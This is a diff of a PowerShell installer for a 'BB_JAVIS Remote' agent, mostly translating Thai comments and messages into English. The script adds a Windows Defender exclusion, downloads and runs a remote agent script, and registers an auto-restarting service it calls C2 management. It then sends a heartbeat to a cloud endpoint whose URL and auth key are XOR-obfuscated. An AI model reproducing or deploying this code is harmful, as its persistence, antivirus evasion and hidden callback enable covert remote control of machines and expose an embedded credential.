@@ -1,13 +1,12 @@
 # ======================================================================
 # BB_JAVIS Remote - Windows Service Automated Installer (da.gd/bbj-fix)
-# ติดตั้ง Agent เป็น Background Windows Service รันตลอด 24 ชม. อัตโนมัติ (Zero-Dependency)
+# Automated Background Windows Service Installer (Zero-Dependency)
 # ======================================================================
 
-# บังคับการเข้ารหัส Console เป็น UTF-8
 $OutputEncoding = [System.Text.Encoding]::UTF8
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 
-# เปิดใช้งานโปรโตคอล TLS 1.2
+# Enable TLS 1.2 security protocol
 try {
     [System.Net.ServicePointManager]::SecurityProtocol = 3072 -bor 768 -bor 192
 } catch {}
@@ -16,12 +15,12 @@ Write-Host "====================================================================
 Write-Host "       BB_JAVIS REMOTE - BACKGROUND SERVICE AUTOMATED INSTALLER       " -ForegroundColor Yellow
 Write-Host "======================================================================" -ForegroundColor DarkCyan
 
-# 1. ตรวจสอบสิทธิ์ Administrator
+# 1. Administrator Privilege Check
 $currentUser = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
 $isAdmin = $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
-    Write-Host "`n[ERROR] สิทธิ์ไม่เพียงพอ! กรุณาเปิด PowerShell ด้วยสิทธิ์ Administrator (Run as Administrator)" -ForegroundColor Red
-    Write-Host "แล้ววางคำสั่งติดตั้งใหม่อีกครั้งครับ`n" -ForegroundColor Yellow
+    Write-Host "`n[ERROR] Elevated privileges required! Please run PowerShell as Administrator." -ForegroundColor Red
+    Write-Host "Then run the installer command again.`n" -ForegroundColor Yellow
     return
 }
 
@@ -29,20 +28,20 @@ $svcName = "BB_JAVIS_Remote"
 $installDir = "C:\ProgramData\BB_Javis"
 if (-not (Test-Path $installDir)) {
     $null = New-Item -ItemType Directory -Path $installDir -Force
-    Write-Host "[SETUP] สร้างโฟลเดอร์สำหรับ Service: $installDir" -ForegroundColor Green
+    Write-Host "[SETUP] Created installation directory: $installDir" -ForegroundColor Green
 }
 
-# 1.1 หยุดและลบ Service เดิมก่อนเสมอ (เพื่อปลดล็อกไฟล์ BBJavisService.exe และทรัพยากร)
+# 1.1 Stop and remove existing service if present
 $existingSvc = Get-Service -Name $svcName -ErrorAction SilentlyContinue
 if ($existingSvc) {
-    Write-Host "[SERVICE] พบ Service เดิม กำลังหยุดและปลดล็อกไฟล์..." -ForegroundColor Yellow
+    Write-Host "[SERVICE] Found existing service. Stopping and cleaning up..." -ForegroundColor Yellow
     & sc.exe stop $svcName 2>&1 | Out-Null
     Start-Sleep -Seconds 2
     & sc.exe delete $svcName 2>&1 | Out-Null
     Start-Sleep -Seconds 1
 }
 
-# บังคับปิด Process เก่าที่ค้างอยู่ใน C:\ProgramData\BB_Javis
+# Terminate any dangling processes in installDir
 try {
     Get-Process -Name "BBJavisService" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
     Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {
@@ -54,41 +53,41 @@ try {
 } catch {}
 Start-Sleep -Milliseconds 500
 
-# 2. ตั้งค่า Windows Defender Exclusion สำหรับโฟลเดอร์รันงาน
+# 2. Windows Defender Exclusion
 try {
-    Write-Host "[PRE-CHECK] ตั้งค่าข้อยกเว้น Windows Defender ในโฟลเดอร์ $installDir..." -ForegroundColor DarkGray
+    Write-Host "[PRE-CHECK] Setting Windows Defender exclusion for $installDir..." -ForegroundColor DarkGray
     Add-MpPreference -ExclusionPath $installDir -ErrorAction SilentlyContinue
 } catch {}
 
-# 3. จัดเตรียมไฟล์ start_remote_agent.ps1 (รองรับทั้ง Local และ Remote irm | iex)
+# 3. Prepare start_remote_agent.ps1
 $localAgent = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "start_remote_agent.ps1" } else { $null }
 $targetAgent = Join-Path $installDir "start_remote_agent.ps1"
 
 if ($localAgent -and (Test-Path $localAgent)) {
     Copy-Item $localAgent $targetAgent -Force
-    Write-Host "[COPY] คัดลอก start_remote_agent.ps1 ไปยัง $installDir เรียบร้อย" -ForegroundColor Green
+    Write-Host "[COPY] start_remote_agent.ps1 copied to $installDir successfully." -ForegroundColor Green
 } else {
-    Write-Host "[DOWNLOAD] กำลังดาวน์โหลด start_remote_agent.ps1 จากคลาวด์ทางการ..." -ForegroundColor Cyan
+    Write-Host "[DOWNLOAD] Downloading start_remote_agent.ps1 from official cloud repository..." -ForegroundColor Cyan
     $rawUrl = "https://raw.githubusercontent.com/SDPLaos2023/CMD_Remote_Javis/main/start_remote_agent.ps1"
     try {
         $wc = New-Object System.Net.WebClient
         $wc.Encoding = [System.Text.Encoding]::UTF8
         $wc.DownloadFile($rawUrl, $targetAgent)
         $wc.Dispose()
-        Write-Host "[DOWNLOAD] ดาวน์โหลด start_remote_agent.ps1 เรียบร้อย" -ForegroundColor Green
+        Write-Host "[DOWNLOAD] start_remote_agent.ps1 downloaded successfully." -ForegroundColor Green
     } catch {
-        Write-Host "[ERROR] ไม่สามารถดาวน์โหลด start_remote_agent.ps1 ได้: $_" -ForegroundColor Red
+        Write-Host "[ERROR] Failed to download start_remote_agent.ps1: $_" -ForegroundColor Red
         return
     }
 }
 
-# คัดลอก curl.exe หากมีอยู่
+# Copy curl.exe if available
 $localCurl = if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) { Join-Path $PSScriptRoot "curl.exe" } else { $null }
 if ($localCurl -and (Test-Path $localCurl)) {
     Copy-Item $localCurl (Join-Path $installDir "curl.exe") -Force
 }
 
-# 4. สร้าง Source Code C# Service Wrapper (BBJavisService.cs)
+# 4. Generate C# Service Wrapper (BBJavisService.cs)
 $csSourcePath = Join-Path $installDir "BBJavisService.cs"
 $csCode = @"
 using System;
@@ -141,25 +140,19 @@ namespace BBJavisService
 
         protected override void OnStop()
         {
-            StopProcess();
-        }
-
-        protected override void OnShutdown()
-        {
-            StopProcess();
-        }
-
-        private void StopProcess()
-        {
             try
             {
                 if (_agentProcess != null && !_agentProcess.HasExited)
                 {
                     _agentProcess.Kill();
-                    _agentProcess.WaitForExit(5000);
                 }
             }
             catch {}
+        }
+
+        protected override void OnShutdown()
+        {
+            this.OnStop();
         }
 
         public static void Main()
@@ -171,48 +164,48 @@ namespace BBJavisService
 "@
 [System.IO.File]::WriteAllText($csSourcePath, $csCode, [System.Text.Encoding]::UTF8)
 
-# 5. ค้นหา C# Compiler (csc.exe) ภายในเครื่อง (Zero-Dependency 100%)
+# 5. Locate Built-in C# Compiler (csc.exe)
 $csc = "$env:WINDIR\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
 if (-not (Test-Path $csc)) {
     $csc = "$env:WINDIR\Microsoft.NET\Framework\v4.0.30319\csc.exe"
 }
 if (-not (Test-Path $csc)) {
-    Write-Host "[ERROR] ไม่พบ .NET Framework C# Compiler (csc.exe) บนเครื่องนี้!" -ForegroundColor Red
+    Write-Host "[ERROR] .NET Framework C# Compiler (csc.exe) not found on this machine!" -ForegroundColor Red
     return
 }
 
-# 6. คอมไพล์ BBJavisService.exe
+# 6. Compile BBJavisService.exe
 $targetExe = Join-Path $installDir "BBJavisService.exe"
 if (Test-Path $targetExe) {
     try { Remove-Item $targetExe -Force -ErrorAction SilentlyContinue } catch {}
 }
-Write-Host "[COMPILE] กำลังคอมไพล์ C# Windows Service Wrapper..." -ForegroundColor Cyan
+Write-Host "[COMPILE] Compiling C# Windows Service Wrapper..." -ForegroundColor Cyan
 & $csc /nologo /target:exe /r:System.dll,System.ServiceProcess.dll /out:$targetExe $csSourcePath
 if ($LASTEXITCODE -ne 0 -or -not (Test-Path $targetExe)) {
     if (Test-Path $targetExe) {
-        Write-Host "[REUSE] ไฟล์ wrapper เดิมยังคงใช้งานได้ กำลังดำเนินการลงทะเบียนต่อ..." -ForegroundColor Yellow
+        Write-Host "[REUSE] Existing wrapper executable is available. Continuing registration..." -ForegroundColor Yellow
     } else {
-        Write-Host "[ERROR] คอมไพล์ BBJavisService.exe ไม่สำเร็จ (Exit code: $LASTEXITCODE)" -ForegroundColor Red
+        Write-Host "[ERROR] Compilation failed (Exit code: $LASTEXITCODE)" -ForegroundColor Red
         return
     }
 } else {
-    Write-Host "[COMPILE] คอมไพล์ BBJavisService.exe สำเร็จสมบูรณ์! (Native 100%)" -ForegroundColor Green
+    Write-Host "[COMPILE] BBJavisService.exe compiled successfully! (Native 100%)" -ForegroundColor Green
 }
 
-# 7. ลงทะเบียน Service กับ Windows Service Control Manager (SCM)
-Write-Host "[SERVICE] กำลังลงทะเบียน Windows Service: $svcName..." -ForegroundColor Cyan
+# 7. Register Service with Windows SCM
+Write-Host "[SERVICE] Registering Windows Service: $svcName..." -ForegroundColor Cyan
 $binPathArg = "`"$targetExe`""
 & sc.exe create $svcName binPath= $binPathArg start= auto DisplayName= "BB_JAVIS Remote Agent Service" 2>&1 | Out-Null
 & sc.exe description $svcName "Background Remote Agent for BB_JAVIS C2 Management (Always-On)" 2>&1 | Out-Null
 & sc.exe failure $svcName reset= 86400 actions= restart/5000/restart/10000/restart/60000 2>&1 | Out-Null
 
-# 8. สร้างสคริปต์ uninstall ไว้ในโฟลเดอร์สำหรับใช้งานในอนาคต
+# 8. Create local uninstaller script
 $uninstallPs1Content = @'
-# สคริปต์ถอนการติดตั้ง BB_JAVIS Remote Service
+# BB_JAVIS Remote Service Uninstaller
 $OutputEncoding = [System.Text.Encoding]::UTF8
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $svcName = "BB_JAVIS_Remote"
-Write-Host "กำลังถอนการติดตั้ง $svcName..." -ForegroundColor Yellow
+Write-Host "Uninstalling $svcName..." -ForegroundColor Yellow
 try {
     $cfgPath = "C:\ProgramData\BB_Javis\service_config.json"
     if (Test-Path $cfgPath) {
@@ -231,7 +224,7 @@ try {
 Start-Sleep -Seconds 1
 & sc.exe delete $svcName 2>&1 | Out-Null
 Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -like "*BB_Javis*" } | Stop-Process -Force -ErrorAction SilentlyContinue
-Write-Host "[SUCCESS] ถอนการติดตั้ง BB_JAVIS Remote Service สำเร็จเรียบร้อยแล้ว!" -ForegroundColor Green
+Write-Host "[SUCCESS] BB_JAVIS Remote Service uninstalled successfully!" -ForegroundColor Green
 '@
 [System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.ps1"), $uninstallPs1Content, [System.Text.Encoding]::UTF8)
 
@@ -243,7 +236,7 @@ pause
 "@
 [System.IO.File]::WriteAllText((Join-Path $installDir "uninstall_service.bat"), $uninstallBatContent, [System.Text.Encoding]::UTF8)
 
-# 8.5 จัดการ Persistent PIN และชื่อเครื่อง (Custom Host Name / Alias)
+# 8.5 Manage Persistent PIN and Custom Host Name (Display Alias)
 $cfgFile = Join-Path $installDir "service_config.json"
 $assignedPin = ""
 $existingCustomName = ""
@@ -261,20 +254,19 @@ if ([string]::IsNullOrWhiteSpace($assignedPin)) {
     $assignedPin = (Get-Random -Minimum 1000 -Maximum 10000).ToString()
 }
 
-# กำหนดชื่อเครื่อง (Custom Host Name / Display Alias)
 $defaultHost = if (-not [string]::IsNullOrWhiteSpace($existingCustomName)) { $existingCustomName } else { $env:COMPUTERNAME }
 $chosenHost = ""
 
-# ตรวจสอบตัวแปร Environment ก่อน (สำหรับโหมด Silent Script)
+# Check environment variable first (for automation scripts)
 if (-not [string]::IsNullOrWhiteSpace($env:BB_JAVIS_HOST)) {
     $chosenHost = $env:BB_JAVIS_HOST.Trim()
 } elseif ([Environment]::UserInteractive) {
     Write-Host ""
     Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
-    Write-Host "  กำหนดชื่อเครื่องสำหรับแสดงผลบนระบบควบคุม (Custom Host Name / Alias)" -ForegroundColor Yellow
-    Write-Host "  [กด Enter เพื่อใช้ชื่อเดิม/ชื่อเครื่องจริง: '$defaultHost']" -ForegroundColor Gray
+    Write-Host "  Set Custom Host Name for Fleet Management (Display Alias)" -ForegroundColor Yellow
+    Write-Host "  [Press Enter to use default: '$defaultHost']" -ForegroundColor Gray
     try {
-        $inputHost = Read-Host "  ระบุชื่อเครื่อง"
+        $inputHost = Read-Host "  Enter machine name"
         if (-not [string]::IsNullOrWhiteSpace($inputHost)) {
             $chosenHost = $inputHost.Trim()
         }
@@ -286,7 +278,7 @@ if ([string]::IsNullOrWhiteSpace($chosenHost)) {
     $chosenHost = $defaultHost
 }
 
-# บันทึก service_config.json ล่วงหน้าเพื่อให้ Service นำไปใช้ได้ทันที 0ms
+# Pre-save service_config.json for instant resolution
 try {
     $preCfg = @{
         pin = $assignedPin
@@ -300,16 +292,16 @@ try {
     [System.IO.File]::WriteAllText($cfgFile, $preCfg, $utf8NoBom)
 } catch {}
 
-# 9. เริ่มต้น Service ทันที
-Write-Host "[START] กำลังเริ่มต้นบริการ $svcName..." -ForegroundColor Cyan
+# 9. Start Windows Service
+Write-Host "[START] Starting service $svcName..." -ForegroundColor Cyan
 try {
     Start-Service -Name $svcName -ErrorAction Stop
 } catch {
-    Write-Host "[WARNING] ไม่สามารถ Start-Service ได้โดยตรง กำลังลองผ่าน sc.exe start..." -ForegroundColor Yellow
+    Write-Host "[WARNING] Direct Start-Service failed, trying via sc.exe start..." -ForegroundColor Yellow
     & sc.exe start $svcName 2>&1 | Out-Null
 }
 
-# ดึง Local IP
+# Local IP Resolution
 $localIp = "127.0.0.1"
 try {
     $localIp = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias * -ErrorAction SilentlyContinue |
@@ -317,8 +309,8 @@ try {
                 Select-Object -ExpandProperty IPAddress -First 1)
 } catch {}
 
-# 10. ยืนยันสถานะการเริ่มทำงานของ Service และลงทะเบียน Heartbeat บน Cloud
-Write-Host "[INIT] กำลังเชื่อมต่อและลงทะเบียนสถานะอุปกรณ์บนระบบ Cloud..." -ForegroundColor Cyan
+# 10. Initial Heartbeat & Presence Registration
+Write-Host "[INIT] Registering initial presence heartbeat on Cloud..." -ForegroundColor Cyan
 try {
     $initHbUrl = "$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x32, 0x2e, 0x2e, 0x2a, 0x29, 0x60, 0x75, 0x75, 0x2f, 0x3b, 0x2e, 0x77, 0x3b, 0x2a, 0x33, 0x77, 0x3b, 0x3d, 0x3f, 0x34, 0x2e, 0x77, 0x3e, 0x3f, 0x3c, 0x3b, 0x2f, 0x36, 0x2e, 0x77, 0x28, 0x2e, 0x3e, 0x38, 0x74, 0x3c, 0x33, 0x28, 0x3f, 0x38, 0x3b, 0x29, 0x3f, 0x33, 0x35, 0x74, 0x39, 0x35, 0x37, 0x75) | ForEach-Object { [byte]($_ -bxor 0x5a) })))devices/$assignedPin.json?auth=$([System.Text.Encoding]::UTF8.GetString([byte[]](@(0x3c, 0x6d, 0x0a, 0x29, 0x03, 0x2a, 0x0d, 0x69, 0x00, 0x1c, 0x11, 0x0a, 0x6b, 0x11, 0x1e, 0x3d, 0x39, 0x3e, 0x0c, 0x68, 0x3e, 0x1c, 0x0a, 0x2e, 0x3e, 0x3b, 0x32, 0x11, 0x3c, 0x38, 0x32, 0x6b, 0x10, 0x12, 0x6c, 0x32, 0x6d, 0x16, 0x63, 0x6e) | ForEach-Object { [byte]($_ -bxor 0x5a) })))"
     $initHbData = @{
@@ -340,12 +332,12 @@ try {
     $st.Write($b, 0, $b.Length)
     $st.Close()
     $null = $req.GetResponse()
-    Write-Host "[INIT] บริการเบื้องหลังเริ่มต้นทำงานและเชื่อมต่อระบบเรียบร้อยแล้ว (ONLINE)" -ForegroundColor Green
+    Write-Host "[INIT] Background service connected to cloud successfully! (ONLINE)" -ForegroundColor Green
 } catch {
-    Write-Host "[INIT] บริการเบื้องหลังเริ่มต้นทำงานเรียบร้อยแล้ว" -ForegroundColor Green
+    Write-Host "[INIT] Background service started." -ForegroundColor Green
 }
 
-# 11. แสดงแบนเนอร์สรุปผลลัพธ์
+# 11. Summary Banner
 Write-Host ""
 Write-Host "======================================================================" -ForegroundColor DarkCyan
 Write-Host "              BB_JAVIS BACKGROUND SERVICE INSTALLED                   " -ForegroundColor Yellow
@@ -353,7 +345,7 @@ Write-Host "====================================================================
 Write-Host "  -> Service Name      : " -NoNewline -ForegroundColor Gray
 Write-Host "$svcName (RUNNING)" -ForegroundColor Green
 Write-Host "  -> Startup Type      : " -NoNewline -ForegroundColor Gray
-Write-Host "Automatic (รันเบื้องหลังทันทีเมื่อเปิดเครื่อง)" -ForegroundColor White
+Write-Host "Automatic (Starts automatically on system boot)" -ForegroundColor White
 Write-Host "  -> Persistent PIN    : " -NoNewline -ForegroundColor Gray
 Write-Host "[ $assignedPin ]" -NoNewline -ForegroundColor Green
 Write-Host " (PERMANENT FIXED PIN)" -ForegroundColor Yellow
@@ -369,9 +361,9 @@ Write-Host "$localIp" -ForegroundColor Cyan
 Write-Host "  -> Presence Status   : " -NoNewline -ForegroundColor Gray
 Write-Host "ONLINE (Real-time SSE Push & Heartbeat 30s)" -ForegroundColor Green
 Write-Host "----------------------------------------------------------------------" -ForegroundColor DarkGray
-Write-Host "  * ระบบกำลังทำงานเบื้องหลังตลอด 24 ชั่วโมงเรียบร้อยแล้ว" -ForegroundColor White
-Write-Host "  * ท่านสามารถ 'ปิดหน้าต่าง PowerShell นี้ได้ทันที' โดยระบบยังคงทำงานต่อ" -ForegroundColor Green
-$targetPromptName = if ($chosenHost -ne $env:COMPUTERNAME) { "$chosenHost หรือ '$env:COMPUTERNAME'" } else { "$env:COMPUTERNAME" }
-Write-Host "  * เครื่องควบคุมสามารถสั่งงานด้วยชื่อ '$targetPromptName' หรือ PIN [ $assignedPin ]" -ForegroundColor Gray
+Write-Host "  * Background agent is now actively running 24/7" -ForegroundColor White
+Write-Host "  * You may SAFELY CLOSE this PowerShell window now" -ForegroundColor Green
+$targetPromptName = if ($chosenHost -ne $env:COMPUTERNAME) { "$chosenHost or '$env:COMPUTERNAME'" } else { "$env:COMPUTERNAME" }
+Write-Host "  * Controllers can target this machine via '$targetPromptName' or PIN [ $assignedPin ]" -ForegroundColor Gray
 Write-Host "======================================================================" -ForegroundColor DarkCyan
 Write-Host ""
